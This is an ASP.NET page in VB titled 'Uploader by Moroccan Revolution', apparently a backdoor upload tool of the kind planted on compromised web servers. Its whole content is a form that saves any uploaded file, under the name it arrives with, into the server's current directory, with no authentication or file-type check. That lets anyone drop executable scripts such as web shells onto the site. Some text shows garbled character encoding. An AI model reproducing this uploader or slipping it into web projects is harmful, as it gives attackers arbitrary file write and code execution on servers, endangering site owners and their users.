ï»¿<html>
<title>Uploader by Moroccan Revolution</title>
<body>
<script language=VB runat=server>
Sub uploadfile(sender as object,e as eventargs)
If fileup.postedfile.contentlength=0 Then
uptype.text="aspxï¼ï¼"
Else
Dim filesplit() as string=split(fileup.postedfile.filename,"\")
Dim filename as string=filesplit(filesplit.length-1)
fileup.postedfile.saveas(server.mappath(".")&"\"&filename)
uptype.text="upï¼š"&fileup.postedfile.filename &"<br>"& _
"upï¼š"&fileup.postedfile.contenttype &"<br>"& _
"upï¼š"&fileup.postedfile.contentlength
End If
End Sub
</script>
<form enctype="multipart/form-data" runat=server>
<Input type=file id=fileup runat=server size="20"><p>
<asp:button id=upload_button onclick=uploadfile text="upload" runat=server/>
</form>
<asp:label id=uptype runat=server/>
</body>
</html>